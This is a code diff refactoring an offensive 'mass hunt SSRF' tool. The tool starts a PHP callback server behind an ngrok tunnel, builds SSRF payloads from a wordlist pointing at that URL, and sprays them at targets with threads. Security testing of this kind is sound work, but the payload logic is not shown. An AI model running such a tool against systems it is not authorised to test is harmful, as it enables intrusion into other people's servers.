@@ -7,9 +7,9 @@ from argparse import ArgumentParser
 from concurrent.futures import ThreadPoolExecutor 
 
 from lib.Engine import Engine
-from lib.Functions import starter
-from lib.PathFunctions import PathFunction
+from lib.Functions import starter, try_payload
 from lib.Globals import ColorObj, port
+from lib.PathFunctions import PathFunction
 
 parser = ArgumentParser(description=colored("Mass hunt SSRF", color='yellow'), epilog=colored("Check your server logs", color='yellow'))
 input_group = parser.add_mutually_exclusive_group()
@@ -34,18 +34,16 @@ def main():
         if ',' in argv.auto:
             server_path, public_path = argv.auto.split(',')
             public_url = path_fn.unslasher(path_fn.slasher(ngrok.connect(port = port)) + path_fn.payloader(public_path))
-            system(f"(cd {server_path}; fuser -k {port}/tcp; php -S 0.0.0.0:{port} 1>/dev/null 2>/dev/null &)")
-            print(f"{ColorObj.information} URL generated: {public_url} ")
         else:
             server_path = argv.auto
             public_url = path_fn.unslasher(ngrok.connect(port = port))
-            system(f"(cd {server_path}; fuser -k {port}/tcp; php -S 0.0.0.0:{port} 1>/dev/null 2>/dev/null &)")
-            print(f"{ColorObj.information} URL generated: {public_url} ")
+        c = f"(cd {server_path}; fuser -k {port}/tcp 1>/dev/null 2>/dev/null; php -S 0.0.0.0:{port} 1>/dev/null 2>/dev/null &)"
+        system(c)
+        print(f"{ColorObj.information} URL generated: {public_url} ")
         p = engine.generate_payloads(input_wordlist, path_fn.urler(public_url))
-    s = [payload for payload_list in p for payload in payload_list]
-    with ThreadPoolExecutor(max_workers=argv.threads) as submitter:
-        futures_objects = [submitter.submit(engine.try_payload, i) for i in s]
-    print(f"{ColorObject.good} Success. Check your server logs for bounty!")
+    with ThreadPoolExecutor(max_workers=argv.threads) as mapper:
+        mapper.map(try_payload, p)
+    print(f"{ColorObj.good} Success. Check your server logs for bounty!")
 
 if __name__ == "__main__":
     main()
